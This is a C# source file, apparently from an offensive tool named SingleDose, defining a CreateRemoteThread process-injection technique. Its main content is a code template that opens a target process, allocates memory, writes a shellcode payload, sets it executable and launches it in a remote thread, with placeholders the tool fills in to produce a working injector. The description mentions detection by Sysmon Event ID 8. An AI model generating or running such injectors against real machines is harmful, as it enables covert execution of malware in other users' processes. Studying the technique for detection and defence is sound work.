using System.Collections.Generic;

namespace SingleDose.Techniques.Injects
{
    internal class CreateRemoteThread : ITechnique
    {
        string ITechnique.TechniqueName => "CreateRemoteThread";

        string ITechnique.TechniqueDescription => "CreateRemoteThread is one of the simplest process injection methods. After allocating and writing shellcode to the remote process," +
            "the inject tells the target process to start a new thread specifying the address of the shellcode as the start. This method is easily identified with Sysmon's Event ID 8.";

        List<string> ITechnique.TechniqueReferences => new List<string>() 
        {
            @"https://sevrosecurity.com/2020/04/08/process-injection-part-1-createremotethread/"
        };

        bool ITechnique.IsUnsafe => false;

        bool ITechnique.IsLoader => false;
        List<string> ITechnique.Invokes => new List<string>() { "VirtualAllocEx", "WriteProcessMemory_ByteArray", "CreateRemoteThread"};
        List<string> ITechnique.Prerequisites => new List<string>() { "ProcessID" };
        string ITechnique.Base => @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Linq;

namespace {{NAMESPACE}}
{
    class Program
    {
        public static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            Process target = Process.GetProcessById({{PROCESSID}});
            IntPtr hAlloc = VirtualAllocEx(target.Handle, IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}});
            IntPtr NumByteWritten = IntPtr.Zero;
            WriteProcessMemory(target.Handle, hAlloc, payload, (uint)payload.Length, out NumByteWritten);
            {{PROTECT}}
            CreateRemoteThread(target.Handle, IntPtr.Zero, 0, hAlloc, IntPtr.Zero, 0, IntPtr.Zero);
        }
        {{ARGS}}
        {{INVOKE}}
    }
}";

        string ITechnique.VProtect => @"uint oldProtect;
            VirtualProtectEx(target.Handle, hAlloc, payload.Length, 0x20, out oldProtect);";
    }
}
